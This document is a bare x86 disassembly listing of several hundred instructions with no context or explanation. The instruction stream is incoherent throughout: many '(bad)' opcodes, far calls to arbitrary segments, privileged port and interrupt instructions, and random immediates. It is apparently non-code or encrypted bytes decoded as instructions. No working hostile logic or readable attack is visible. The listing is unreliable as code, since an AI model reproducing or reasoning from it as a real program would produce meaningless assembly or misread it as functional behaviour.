  42ed83:	push   ecx
  42ed84:	mov    dl,0xde
  42ed86:	jmp    0xeeb5e8be
  42ed8b:	xor    eax,0x4b380b88
  42ed90:	sub    DWORD PTR [edx+0x1b],0xffffffbf
  42ed94:	mov    ebx,0x4051a1e9
  42ed99:	or     ebp,edi
  42ed9b:	test   DWORD PTR [esi+esi*4+0x31],0x8d19d6ed
  42eda3:	mov    eax,ds:0xa68e0b42
  42eda8:	loope  0x42ed3b
  42edaa:	and    eax,0x5564b2a5
  42edaf:	xchg   edx,eax
  42edb0:	in     al,0x49
  42edb2:	jp     0x42ee24
  42edb4:	fs in  eax,dx
  42edb6:	sbb    al,0xa7
  42edb8:	popf   
  42edb9:	jb     0x42ee29
  42edbb:	mov    ebp,0x3bec15f8
  42edc0:	mov    DWORD PTR [ecx-0x2f],ebx
  42edc3:	imul   edi,DWORD PTR [ebx-0x71291fec],0xffffffaf
  42edca:	shr    BYTE PTR [ecx],cl
  42edcc:	mov    dl,0xf
  42edce:	aam    0x8
  42edd0:	shl    eax,1
  42edd2:	push   eax
  42edd3:	mov    eax,0xe742a2c9
  42edd8:	hlt    
  42edd9:	push   es
  42edda:	pop    eax
  42eddb:	or     edx,DWORD PTR [edx+0x62a49aa0]
  42ede1:	sahf   
  42ede2:	jae    0x42edcf
  42ede4:	cmp    DWORD PTR [edi+0x60fda74b],ebx
  42edea:	lds    edx,FWORD PTR [esp+edx*1-0x4db911cf]
  42edf1:	addr16 xchg ecx,eax
  42edf3:	sbb    eax,0x9533a90b
  42edf8:	into   
  42edf9:	or     ecx,DWORD PTR [esi]
  42edfb:	mov    ds:0xca1f4584,eax
  42ee00:	jle    0x42edef
  42ee02:	retf   0x7d08
  42ee05:	jbe    0x42eda1
  42ee07:	cmc    
  42ee08:	xor    cl,dh
  42ee0a:	mov    ecx,0x5174dd1d
  42ee0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ee10:	jmp    0xb1fdc356
  42ee15:	sub    DWORD PTR [ecx-0x66241aa5],eax
  42ee1b:	rol    BYTE PTR [eax],0xc7
  42ee1e:	idiv   edx
  42ee20:	mov    BYTE PTR [ebx+0xc485986],bh
  42ee26:	pop    esp
  42ee27:	adc    esi,DWORD PTR [ebx-0x69]
  42ee2a:	jmp    0x8d8767c6
  42ee2f:	sub    DWORD PTR [edx+0xceb31e6],esi
  42ee35:	dec    ebp
  42ee36:	inc    DWORD PTR [ecx-0x23]
  42ee39:	or     bl,cl
  42ee3b:	fs daa 
  42ee3d:	pushf  
  42ee3e:	push   ebx
  42ee3f:	mov    ds:0x53431333,al
  42ee44:	pop    ebp
  42ee45:	xor    BYTE PTR [ebp+0x66953402],dl
  42ee4b:	pop    es
  42ee4c:	jbe    0x42ee52
  42ee4e:	test   eax,0xc90b312f
  42ee53:	call   0xab8de4e6
  42ee58:	mov    eax,ds:0x403e9a7d
  42ee5d:	popfw  
  42ee5f:	inc    ebx
  42ee60:	scas   al,BYTE PTR es:[edi]
  42ee61:	add    dl,BYTE PTR [ecx]
  42ee63:	mov    al,ds:0xa11a88ba
  42ee68:	and    ebx,DWORD PTR [ebx-0x1d]
  42ee6b:	pop    ebx
  42ee6c:	ret    0x764e
  42ee6f:	dec    eax
  42ee70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ee71:	cdq    
  42ee72:	(bad)
  42ee75:	jae    0x42ee93
  42ee77:	and    al,0xf9
  42ee79:	std    
  42ee7a:	mov    ecx,0x49ae1aa7
  42ee7f:	push   esi
  42ee80:	fist   DWORD PTR [ebp+0x3b]
  42ee83:	test   al,0x5a
  42ee85:	xchg   DWORD PTR [edi-0x167441fc],esp
  42ee8b:	xor    eax,esi
  42ee8d:	push   ecx
  42ee8e:	and    BYTE PTR [edi+eiz*2-0x5f1f13f5],dh
  42ee95:	fdivr  QWORD PTR [ecx-0x35]
  42ee98:	sub    al,0xfc
  42ee9a:	call   0x7253:0x96896ca6
  42eea1:	adc    cl,ah
  42eea3:	push   DWORD PTR [esi+0x11]
  42eea6:	call   0xaa2:0x6aa79393
  42eead:	and    BYTE PTR [ecx-0x155914ff],bl
  42eeb3:	sbb    al,0xcf
  42eeb5:	fcmovnb st,st(1)
  42eeb7:	mov    edi,0x33a509ef
  42eebc:	push   ecx
  42eebd:	dec    ebx
  42eebe:	push   esi
  42eebf:	call   0xba3374b6
  42eec4:	pushf  
  42eec5:	mov    eax,0x5cb2dddd
  42eeca:	mov    cl,0x4b
  42eecc:	imul   esp,DWORD PTR [ebx],0xffffffc5
  42eecf:	mov    ds:0xacf1b19b,al
  42eed4:	fild   QWORD PTR [ebx+0x498c40bb]
  42eeda:	push   ebx
  42eedb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42eedc:	dec    eax
  42eedd:	push   ss
  42eede:	xor    al,0x3b
  42eee0:	and    bl,bh
  42eee2:	(bad)  
  42eee3:	xor    DWORD PTR [eax+0x64a7d979],ebp
  42eee9:	mov    bl,0x1e
  42eeeb:	mov    al,0x0
  42eeed:	imul   ebp,DWORD PTR [eax-0x12],0x5f
  42eef1:	mov    WORD PTR [esi-0x46fd2ac4],fs
  42eef7:	(bad)  
  42eef9:	retf   
  42eefa:	fcomip st,st(1)
  42eefc:	lods   al,BYTE PTR ds:[esi]
  42eefd:	or     eax,DWORD PTR [eax]
  42eeff:	test   DWORD PTR [edi+0x292fef06],ecx
  42ef05:	pop    edi
  42ef06:	call   0x4ec9:0x463ca08f
  42ef0d:	loop   0x42ef84
  42ef0f:	scas   al,BYTE PTR es:[edi]
  42ef10:	fidivr DWORD PTR [ecx]
  42ef12:	mov    al,ds:0xfa1cbd78
  42ef17:	das    
  42ef18:	inc    ebp
  42ef19:	mov    ebx,0xbab263b0
  42ef1e:	jbe    0x42ef4c
  42ef20:	xchg   ebp,eax
  42ef21:	mov    cl,0xd7
  42ef23:	stos   DWORD PTR es:[edi],eax
  42ef24:	mov    ebx,0x33af6c36
  42ef29:	jns    0x42eedf
  42ef2b:	imul   esi,DWORD PTR ds:0xcf978a69,0xb2e322ee
  42ef35:	jecxz  0x42efb4
  42ef37:	(bad)  
  42ef38:	out    0x83,eax
  42ef3a:	cli    
  42ef3b:	adc    edx,DWORD PTR [ebp+0xd258c35]
  42ef41:	in     eax,dx
  42ef42:	call   0x8efc:0xf4bb7bbc
  42ef49:	sub    DWORD PTR [eax-0x6f],edi
  42ef4c:	mov    dl,0x33
  42ef4e:	test   DWORD PTR [ebx+0x41],0xddefecb
  42ef55:	or     esp,esi
  42ef57:	xchg   edx,eax
  42ef58:	imul   BYTE PTR [ebp+0x7a794910]
  42ef5e:	call   0x1e87:0x91143661
  42ef65:	out    dx,al
  42ef66:	loope  0x42ef06
  42ef68:	xor    ebx,DWORD PTR [eax-0x6d]
  42ef6b:	xor    esp,DWORD PTR [ecx]
  42ef6d:	rcr    BYTE PTR [edx+0x2317f019],cl
  42ef73:	out    0xb2,eax
  42ef75:	(bad)  
  42ef77:	add    eax,0x229211fb
  42ef7c:	jno    0x42ef8c
  42ef7e:	fs cmp bh,ah
  42ef81:	js     0x42ef26
  42ef83:	pusha  
  42ef84:	sbb    edi,DWORD PTR [ebx+0x54]
  42ef87:	aaa    
  42ef88:	(bad)  
  42ef89:	fcomp  QWORD PTR [ebp-0x6df24976]
  42ef8f:	pop    ebp
  42ef90:	inc    edx
  42ef91:	adc    al,0x82
  42ef93:	popf   
  42ef94:	and    BYTE PTR [esi+eiz*8],cl
  42ef97:	std    
  42ef98:	cli    
  42ef99:	push   0x52
  42ef9b:	xlat   BYTE PTR ds:[ebx]
  42ef9c:	lods   al,BYTE PTR ds:[esi]
  42ef9d:	aaa    
  42ef9e:	enter  0x97e6,0x33
  42efa2:	iret   
  42efa3:	stc    
  42efa4:	ror    DWORD PTR [ebx],0x21
  42efa7:	mov    ebx,0x9994fce4
  42efac:	mov    dl,0x60
  42efae:	test   eax,0x92bea6ed
  42efb3:	shl    BYTE PTR [ebx+ecx*1-0x4bc49e31],0xc8
  42efbb:	push   es
  42efbc:	and    BYTE PTR [edi-0x79],al
  42efbf:	xor    al,0xd4
  42efc1:	xchg   ecx,eax
  42efc2:	pop    edx
  42efc3:	mov    ?,WORD PTR [ecx-0x70f62f70]
  42efc9:	sti    
  42efca:	imul   esp,DWORD PTR [edi-0x2eef95a9],0xffffff83
  42efd1:	mov    ecx,edi
  42efd3:	mov    esp,0x1f9c86b2
  42efd8:	ror    BYTE PTR [edx],1
  42efda:	jb     0x42f03f
  42efdc:	inc    ecx
  42efdd:	or     eax,DWORD PTR [eax]
  42efdf:	xchg   DWORD PTR [ebp+0x37],eax
  42efe2:	je     0x42efd0
  42efe4:	call   esp
  42efe6:	call   0x7f2c:0xeb5b94be
  42efed:	add    BYTE PTR [edi-0x26ece059],dh
  42eff3:	out    dx,eax
  42eff4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42eff5:	icebp  
  42eff6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eff7:	xchg   edi,eax
  42eff8:	mov    DWORD PTR [ebp+0x3ed22735],ebp
  42effe:	sub    ebx,ebp
  42f000:	dec    ecx
  42f001:	lds    ebx,FWORD PTR [ecx-0x60]
  42f004:	mov    ah,0x64
  42f006:	sti    
  42f007:	inc    esi
  42f008:	aaa    
  42f009:	retf   
  42f00a:	mov    dh,0x43
  42f00c:	adc    eax,0xb244e237
  42f011:	dec    ebx
  42f012:	retf   
  42f013:	or     DWORD PTR [eax],0x4ed64b11
  42f019:	push   edi
  42f01a:	and    ecx,0x3ba760b2
  42f020:	xlat   BYTE PTR ds:[ebx]
  42f021:	popa   
  42f022:	ja     0x42f06f
  42f024:	mov    dl,0xc5
  42f026:	inc    edi
  42f027:	sahf   
  42f028:	xchg   BYTE PTR [edx+0x8d190a4],dh
  42f02e:	les    esp,FWORD PTR [edx]
  42f030:	push   ebx
  42f031:	mov    ebx,0x2722b9c0
  42f036:	push   edi
  42f037:	mov    cl,0xb2
  42f039:	call   0x66ec:0x85a9c536
  42f040:	push   eax
  42f041:	ja     0x42f068
  42f043:	cwde   
  42f044:	stos   DWORD PTR es:[edi],eax
  42f045:	or     al,0x1a
  42f047:	mov    bh,0x84
  42f049:	dec    ebp
  42f04a:	add    eax,DWORD PTR ds:0x769b5159
  42f050:	loope  0x42f028
  42f052:	and    al,0x31
  42f054:	cli    
  42f055:	aas    
  42f056:	push   0xffffffdc
  42f058:	ins    DWORD PTR es:[edi],dx
  42f059:	or     al,0x39
  42f05b:	add    BYTE PTR [edx-0x5b],al
  42f05e:	clc    
  42f05f:	xchg   DWORD PTR [eax-0x3a],esp
  42f062:	mov    eax,0xe80796b8
  42f067:	pop    es
  42f068:	mov    dl,0x2
  42f06a:	stos   DWORD PTR es:[edi],eax
  42f06b:	sbb    bh,BYTE PTR ds:0x9cd8a182
  42f071:	or     eax,ecx
  42f073:	sub    al,0x5c
  42f075:	stos   BYTE PTR es:[edi],al
  42f076:	inc    ebx
  42f077:	xchg   DWORD PTR [ecx-0x417b657b],ebx
  42f07d:	mov    bh,0xa
  42f07f:	inc    esi
  42f080:	mov    al,ds:0x1b90ee1
  42f085:	(bad)  
  42f086:	dec    ebx
  42f087:	div    BYTE PTR ds:0x1ef5
  42f08c:	sub    ch,BYTE PTR [edi-0x604c66]
  42f092:	xor    BYTE PTR [esp+eax*8],dh
  42f095:	arpl   sp,cx
  42f097:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f098:	iret   
  42f099:	xlat   BYTE PTR ds:[ebx]
  42f09a:	jne    0x42f049
  42f09c:	sub    DWORD PTR [edx],esp
  42f09e:	fs dec ecx
  42f0a0:	mov    dl,0x66
  42f0a2:	jns    0x42f113
  42f0a4:	sub    al,0x2e
  42f0a6:	stos   DWORD PTR es:[edi],eax
  42f0a7:	nop
  42f0a8:	dec    esi
  42f0a9:	or     ebp,DWORD PTR [ecx-0x71474e24]
  42f0af:	jne    0x42f0e5
  42f0b1:	daa    
  42f0b2:	call   0x9b2b:0x3673079e
  42f0b9:	mov    ebx,0x41c2a688
  42f0be:	and    DWORD PTR [ebx-0x39],esi
  42f0c1:	gs std 
  42f0c3:	inc    edi
  42f0c4:	div    BYTE PTR ds:0x90affd9a
  42f0ca:	js     0x42f0fb
  42f0cc:	fs imul esp,esi,0x3ddcdda7
  42f0d3:	dec    esp
  42f0d4:	dec    ebx
  42f0d5:	arpl   WORD PTR [ecx],bp
  42f0d7:	retf   0xb650
  42f0da:	popf   
  42f0db:	pop    ds
  42f0dc:	jns    0x42f073
  42f0de:	push   edx
  42f0df:	rcl    ebx,cl
  42f0e1:	in     al,0xe
  42f0e3:	fimul  WORD PTR [edi+0x30]
  42f0e6:	outs   dx,BYTE PTR gs:[si]
  42f0e9:	dec    edi
  42f0ea:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  42f0ec:	sbb    eax,0x5ae49dae
  42f0f1:	fsub   st,st(0)
  42f0f3:	adc    DWORD PTR [edx+0x637a82fb],esi
  42f0f9:	enter  0x98f,0xdc
  42f0fd:	or     esp,DWORD PTR [ebx]
  42f0ff:	sbb    BYTE PTR [eax+ecx*2+0x45],0x82
  42f104:	mov    DWORD PTR ds:0x4251a9a,ebp
  42f10a:	dec    edi
  42f10b:	pop    ebp
  42f10c:	jp     0x42f170
  42f10e:	mov    ah,BYTE PTR [edi-0x5299321]
  42f114:	add    DWORD PTR [esi-0x514d970e],eax
  42f11a:	sahf   
  42f11b:	push   0xffffff88
  42f11d:	fcmovnu st,st(4)
  42f11f:	cwde   
  42f120:	js     0x42f12d
  42f122:	dec    eax
  42f123:	in     eax,dx
  42f124:	je     0x42f0ae
  42f126:	dec    ebx
  42f127:	mov    dh,0x6b
  42f129:	adc    DWORD PTR [edx+0x74d4e8e6],ebx
  42f12f:	enter  0xaafb,0xb9
  42f133:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f134:	xor    edi,DWORD PTR [ecx-0x53e82db9]
  42f13a:	jp     0x42f120
  42f13c:	mov    dl,0x50
  42f13e:	push   ds
  42f13f:	lods   al,BYTE PTR ds:[esi]
  42f140:	ror    ebx,cl
  42f142:	pop    ecx
  42f143:	test   BYTE PTR [edx],0xb
  42f146:	mov    ah,0x37
  42f148:	les    esp,FWORD PTR [esi+0x60a015d5]
  42f14e:	call   0x26b6:0xf3d68230
  42f155:	stos   BYTE PTR es:[edi],al
  42f156:	push   edi
  42f157:	mov    ds:0x4c835c34,al
  42f15c:	xlat   BYTE PTR ds:[ebx]
  42f15d:	mov    cl,0x99
  42f15f:	adc    al,0x3
  42f161:	dec    edi
  42f162:	bnd ja 0x42f0ea
  42f165:	out    dx,al
  42f166:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f167:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f168:	adc    esi,DWORD PTR [edx-0x3d3e6acf]
  42f16e:	sub    bl,al
  42f170:	inc    DWORD PTR [edx-0x3b6c5b66]
  42f176:	mov    dl,0x54
  42f178:	retf   0xc469
  42f17b:	(bad)  
  42f17c:	shl    bl,cl
  42f17e:	xchg   ebx,eax
  42f17f:	fldenv [esi]
  42f181:	xor    eax,DWORD PTR [ebx]
  42f183:	jne    0x42f1b7
  42f185:	(bad)  
  42f186:	int3   
  42f187:	dec    edi
  42f188:	cmc    
  42f189:	loop   0x42f16b
  42f18b:	jmp    0x84260c42
  42f190:	add    bh,BYTE PTR [esp+ebp*2-0x67f43661]
  42f197:	test   BYTE PTR [edx-0x22],cl
  42f19a:	jmp    DWORD PTR [ebx+0x59]
  42f19d:	lods   al,BYTE PTR ds:[esi]
  42f19e:	popf   
  42f19f:	(bad)  
  42f1a0:	jno    0x42f1a7
  42f1a2:	clc    
  42f1a3:	inc    edx
  42f1a4:	xor    dl,BYTE PTR [edx]
  42f1a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f1a7:	push   ecx
  42f1a8:	clc    
  42f1a9:	or     edi,ebp
  42f1ab:	jl     0x42f137
  42f1ad:	aad    0xe1
  42f1af:	aam    0xa3
  42f1b1:	loop   0x42f14d
  42f1b3:	or     al,0xce
  42f1b5:	xchg   DWORD PTR [eax],eax
  42f1b7:	mov    ch,0x5c
  42f1b9:	inc    esi
  42f1ba:	xor    eax,0xb5a679a7
  42f1bf:	imul   esp,edi,0xb13e9cf9
  42f1c5:	xor    esp,DWORD PTR es:[ebx-0x5d]
  42f1c9:	push   es
  42f1ca:	and    al,0x17
  42f1cc:	retf   
  42f1cd:	pusha  
  42f1ce:	xor    BYTE PTR [ebx-0xf],cl
  42f1d1:	or     al,0xbf
  42f1d3:	icebp  
  42f1d4:	sar    BYTE PTR [esi-0x57e1bf81],cl
  42f1da:	sbb    cl,BYTE PTR [ecx]
  42f1dc:	jb     0x42f15f
  42f1de:	inc    edi
  42f1df:	push   0xffffffae
  42f1e1:	ins    BYTE PTR es:[edi],dx
  42f1e2:	imul   esi,edx,0xdd0ca4b2
  42f1e8:	push   es
  42f1e9:	or     dl,ah
  42f1eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f1ec:	xchg   edx,eax
  42f1ed:	out    0x8a,al
  42f1ef:	mov    ch,0x7a
  42f1f1:	push   ss
  42f1f2:	push   0xffffffe2
  42f1f4:	mov    dl,0x24
  42f1f6:	mov    bl,0x44
  42f1f8:	sbb    ebx,DWORD PTR [ebp+ecx*4-0x33f461e3]
  42f1ff:	jle    0x42f211
  42f201:	stos   DWORD PTR es:[edi],eax
  42f202:	pop    ebx
  42f203:	ja     0x42f1e6
  42f205:	rcr    BYTE PTR [ebx+0x31797e70],1
  42f20b:	xchg   ecx,eax
  42f20c:	pop    esi
  42f20d:	mov    edx,0xb6386754
  42f212:	adc    ebx,DWORD PTR [ebp-0x66548e6]
  42f218:	out    0xc9,eax
  42f21a:	and    al,0x9f
  42f21c:	outs   dx,BYTE PTR ds:[esi]
  42f21d:	loope  0x42f1b9
  42f21f:	test   BYTE PTR ds:0xc5ebbf14,bh
  42f225:	push   esp
  42f226:	sahf   
  42f227:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f228:	fwait
  42f229:	imul   ecx,DWORD PTR [ebx],0x22f5571a
  42f22f:	into   
  42f230:	mov    esi,0xd7cf9a52
  42f235:	enter  0x7355,0x56
  42f239:	das    
  42f23a:	cld    
  42f23b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f23c:	sbb    dh,BYTE PTR [ebp+0x6c]
  42f23f:	mov    edx,0xa6e79223
  42f244:	mov    dl,0x8b
  42f246:	xchg   BYTE PTR [edi],dl
  42f248:	rcl    DWORD PTR [esi-0x21],0xd
  42f24c:	lock or esi,ebp
  42f24f:	xor    ebp,DWORD PTR [edx+0x7085ad5]
  42f255:	xor    eax,0x43f5009a
  42f25a:	jae    0x42f234
  42f25c:	rcl    BYTE PTR [edx+eiz*8],cl
  42f25f:	aas    
  42f260:	or     BYTE PTR [ebx],0x11
  42f263:	xor    BYTE PTR [edx-0x3d040ea5],cl
  42f269:	sub    dh,dl
  42f26b:	jg     0x42f200
  42f26d:	or     edx,DWORD PTR [ecx-0x5a]
  42f270:	dec    ebx
  42f271:	and    esp,eax
  42f273:	stos   BYTE PTR es:[edi],al
  42f274:	cli    
  42f275:	or     edx,DWORD PTR [edi]
  42f277:	cmp    esp,DWORD PTR [ebp-0x75]
  42f27a:	jb     0x42f203
  42f27c:	xor    ebx,0xe66a8b9a
  42f282:	gs retf 0x3696
  42f286:	ins    DWORD PTR es:[edi],dx
  42f287:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f288:	or     DWORD PTR [esi-0x1331eca0],ebx
  42f28e:	sbb    ch,BYTE PTR [edi-0x4e]
  42f291:	pop    edx
  42f292:	pop    es
  42f293:	pop    esp
  42f294:	sbb    al,0x5d
  42f296:	iret   
  42f297:	sub    al,0x3c
  42f299:	or     eax,DWORD PTR [ebx+0x5c186e7c]
  42f29f:	ret    0x7a33
  42f2a2:	call   0x429c:0x999bf43
  42f2a9:	adc    al,0x36
  42f2ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f2ac:	or     bh,BYTE PTR [ecx]
  42f2ae:	push   ss
  42f2af:	pop    es
  42f2b0:	sub    ecx,ebp
  42f2b2:	inc    edx
  42f2b3:	div    DWORD PTR [edx-0x40c29ca3]
  42f2b9:	push   0xce5f878
  42f2be:	sbb    eax,0xdffdab64
  42f2c3:	cmc    
  42f2c4:	ins    DWORD PTR es:[edi],dx
  42f2c5:	mov    DWORD PTR [ebp+0x47],eax
  42f2c8:	sub    DWORD PTR es:[edi-0x59],edx
  42f2cc:	push   0x509ca4ec
  42f2d1:	xor    DWORD PTR [ebx-0x45d34d3a],ecx
  42f2d7:	imul   edx,DWORD PTR [esi+edx*4],0xf3988fe9
  42f2de:	int3   
  42f2df:	mov    al,ds:0xeb66fa2d
  42f2e4:	or     edi,DWORD PTR [ecx+0x4b6de8be]
  42f2ea:	jle    0x42f274
  42f2ec:	mov    esp,0xf6f25d04
  42f2f1:	inc    ebp
  42f2f2:	call   0x28d:0xf0713b76
  42f2f9:	lea    eax,[esi+0x1d2f8b3e]
  42f2ff:	inc    ebx
  42f300:	test   BYTE PTR [ebx+0x7a],bh
  42f303:	jnp    0x42f2ad
  42f305:	aad    0x58
  42f307:	cdq    
  42f308:	mov    ecx,0xeea99aeb
  42f30d:	or     DWORD PTR [eax-0x658cb134],edx
  42f313:	fxch   st(1)
  42f315:	and    BYTE PTR [edi-0xce4cc29],cl
  42f31b:	pop    ebx
  42f31c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f31d:	loope  0x42f2db
  42f31f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f320:	cli    
  42f321:	orps   xmm2,XMMWORD PTR [edx-0x73d7234d]
  42f328:	mov    dl,0xc
  42f32a:	lahf   
  42f32b:	fstp   st(2)
  42f32d:	in     eax,0x6d
  42f32f:	mov    cl,BYTE PTR [ebp+0x272d830b]
  42f335:	add    esi,DWORD PTR [edx*2+0x159acec9]
  42f33c:	stos   BYTE PTR es:[edi],al
  42f33d:	ror    DWORD PTR [esi+0x56],cl
  42f340:	pop    es
  42f341:	fdiv   DWORD PTR [eax-0x53]
  42f344:	xchg   edi,eax
  42f345:	jl     0x42f32d
  42f347:	pop    esp
  42f348:	inc    esp
  42f349:	or     ah,BYTE PTR [ecx]
  42f34b:	inc    ecx
  42f34c:	pop    esi
  42f34d:	or     cl,al
  42f34f:	xchg   edi,eax
  42f350:	adc    DWORD PTR ds:0x71a4859a,edx
  42f356:	cmc    
  42f357:	pop    es
  42f358:	sub    DWORD PTR [ecx+0x55ba758],edi
  42f35e:	add    dh,al
  42f360:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f361:	pop    ds
  42f362:	adc    ch,cl
  42f364:	mov    dl,0x9b
  42f366:	call   0xa7c807ea
  42f36b:	in     al,dx
  42f36c:	out    dx,eax
  42f36d:	or     al,BYTE PTR [edi+edx*4-0x80]
  42f371:	hlt    
  42f372:	xor    cl,dl
  42f374:	adc    BYTE PTR [ebx-0x40],bh
  42f377:	dec    esi
  42f378:	mov    dl,0x80
  42f37a:	push   ss
  42f37b:	fstp   TBYTE PTR [edx]
  42f37d:	test   al,0x1f
  42f37f:	sub    BYTE PTR [ecx-0x590d72ad],ch
  42f385:	mov    ch,0xbe
  42f387:	push   esi
  42f388:	mov    dl,0xfc
  42f38a:	or     eax,0xc40565bb
  42f38f:	jecxz  0x42f343
  42f391:	sbb    esp,ebx
  42f393:	dec    edi
  42f394:	mov    bh,0xb2
  42f397:	sti    
  42f398:	jmp    0x8722bb13
  42f39d:	sbb    BYTE PTR cs:[ebp-0x26792c92],ch
  42f3a4:	sahf   
  42f3a5:	mov    ebp,0x35d9099a
  42f3aa:	jno    0x42f373
  42f3ac:	jb     0x42f3d1
  42f3ae:	dec    ebx
  42f3af:	adc    DWORD PTR [ecx],edx
  42f3b1:	or     edi,DWORD PTR [esi]
  42f3b3:	dec    ebp
  42f3b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f3b5:	mov    edi,DWORD PTR [ebp+0x1]
  42f3b8:	and    BYTE PTR [edi-0x5b],cl
  42f3bb:	sti    
  42f3bc:	xor    eax,0x267c9e08
  42f3c1:	push   esi
  42f3c2:	pop    es
  42f3c3:	outs   dx,DWORD PTR ds:[esi]
  42f3c4:	jns    0x42f3e0
  42f3c6:	rcr    esi,0x65
  42f3c9:	or     edx,ebx
  42f3cb:	call   DWORD PTR ss:[edx-0x6e]
  42f3cf:	pop    eax
  42f3d0:	mov    cs,WORD PTR [edx+ebx*4-0xb]
  42f3d4:	jmp    0xcceb:0x214e6130
  42f3db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f3dc:	sahf   
  42f3dd:	pop    ss
  42f3de:	mov    edi,0xeb3b1363
  42f3e3:	mov    eax,0xb776bcb2
  42f3e8:	or     bh,BYTE PTR [esi+0x6f]
  42f3eb:	repnz fimul WORD PTR [ebx]
  42f3ee:	into   
  42f3ef:	inc    ebx
  42f3f0:	mov    cl,0x6e
  42f3f2:	(bad)  
  42f3f3:	push   ss
  42f3f4:	daa    
  42f3f5:	cwde   
  42f3f6:	(bad)  
  42f3f7:	out    dx,eax
  42f3f8:	enter  0x790b,0x27
  42f3fc:	mov    eax,ds:0xc687f13e
  42f401:	pop    ss
  42f402:	(bad)  
  42f403:	loop   0x42f472
  42f405:	retf   
  42f406:	fs call 0x16b5:0xa263bfc0
  42f40e:	mov    ds:0xea277247,eax
  42f413:	fidivr DWORD PTR [esi]
  42f415:	add    BYTE PTR [eax+0x77b2aca8],0x6e
  42f41c:	jb     0x42f3ec
  42f41e:	cld    
  42f41f:	mov    dh,0x8f
  42f421:	or     eax,0xb3d6b09a
  42f426:	jg     0x42f412
  42f428:	stc    
  42f429:	add    dh,BYTE PTR [eax-0x67e84760]
  42f42f:	sbb    ch,BYTE PTR [esi-0x44]
  42f432:	int    0x37
  42f434:	test   BYTE PTR [ecx+0x3],bl
  42f437:	aas    
  42f438:	mov    dl,0xc8
  42f43a:	fld1   
  42f43c:	cmp    al,0x87
  42f43e:	mov    esi,0xa50b9da3
  42f443:	sbb    al,BYTE PTR [ebx]
  42f445:	or     al,0xc4
  42f447:	xchg   ebp,eax
  42f448:	jmp    0x9766:0x153291fb
  42f44f:	daa    
  42f450:	fcomp  QWORD PTR [eax+0x34fcaefe]
  42f456:	adc    eax,ecx
  42f458:	xor    eax,0xd78707d5
  42f45d:	mov    edx,DWORD PTR [ecx+0x3e]
  42f460:	pop    ebp
  42f461:	inc    esp
  42f462:	add    dl,dh
  42f464:	mov    ebp,0x7d4bafa7
  42f469:	jmp    0x42f46f
  42f46b:	sub    BYTE PTR [edx+0x12db9b0d],dl
  42f471:	or     BYTE PTR [ebx],cl
  42f473:	inc    ebx
  42f474:	imul   ecx,DWORD PTR [edi],0xffffff86
  42f477:	adc    cl,BYTE PTR [ecx]
  42f479:	jmp    0xd19a:0x69836d5a
  42f480:	mov    al,0x53
  42f482:	mov    edi,DWORD PTR [edx-0x586a0897]
  42f488:	ja     0x42f42e
  42f48a:	inc    eax
  42f48b:	sbb    al,0xe7
  42f48d:	int3   
  42f48e:	test   BYTE PTR [esi],ch
  42f490:	mov    dl,0x3
  42f492:	cmp    esp,DWORD PTR [edi-0x61]
  42f495:	xor    DWORD PTR [edx+0x80b9c3a],0x12
  42f49c:	inc    esp
  42f49d:	in     al,dx
  42f49e:	or     al,0xe
  42f4a0:	pop    esp
  42f4a1:	fstp   QWORD PTR [ebx+0x42b24829]
  42f4a7:	sbb    BYTE PTR [ebx],al
  42f4a9:	ins    BYTE PTR es:[edi],dx
  42f4aa:	ja     0x42f4d9
  42f4ac:	push   esi
  42f4ad:	iret   
  42f4ae:	add    eax,0xabdf58b4
  42f4b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f4b4:	pop    ds
  42f4b5:	xchg   esi,eax
  42f4b6:	mov    edi,0x9aaf9c87
  42f4bb:	stos   DWORD PTR es:[edi],eax
  42f4bc:	mov    cl,0xee
  42f4be:	adc    DWORD PTR [ebx],edi
  42f4c0:	mov    ?,WORD PTR ds:0x43689f1f
  42f4c6:	sbb    bl,dl
  42f4c8:	cmp    eax,DWORD PTR [ecx+0x9dfe27c]
  42f4ce:	data16 mov cl,0x8e
  42f4d1:	int3   
  42f4d2:	sti    
  42f4d3:	fidiv  WORD PTR [edx+0x2ddb9723]
  42f4d9:	sbb    DWORD PTR [ebx+edi*4],0xffffffb9
  42f4dd:	or     eax,DWORD PTR [ebx-0x7e07ac19]
  42f4e3:	ror    ecx,1
  42f4e5:	or     al,0x9a
  42f4e7:	push   0xffffffb6
  42f4e9:	mov    ebp,0xbe16edf6
  42f4ee:	mov    cl,0xa7
  42f4f0:	push   eax
  42f4f1:	jmp    0x42f4b6
  42f4f3:	push   ss
  42f4f4:	test   eax,eax
  42f4f6:	fidivr DWORD PTR [esi]
  42f4f8:	mov    dl,0x3f
  42f4fa:	loop   0x42f4f8
  42f4fc:	sar    BYTE PTR [edx+0x4],1
  42f4ff:	fld    DWORD PTR [edx+0xb]
  42f502:	inc    ecx
  42f503:	push   ds
  42f504:	scas   eax,DWORD PTR es:[edi]
  42f505:	mov    esp,0x9488a3c6
  42f50a:	test   DWORD PTR [edi-0x1],esi
  42f50d:	cdq    
  42f50e:	fisubr DWORD PTR [edx+ebx*2-0x36]
  42f512:	and    al,0x6a
  42f514:	push   ebx
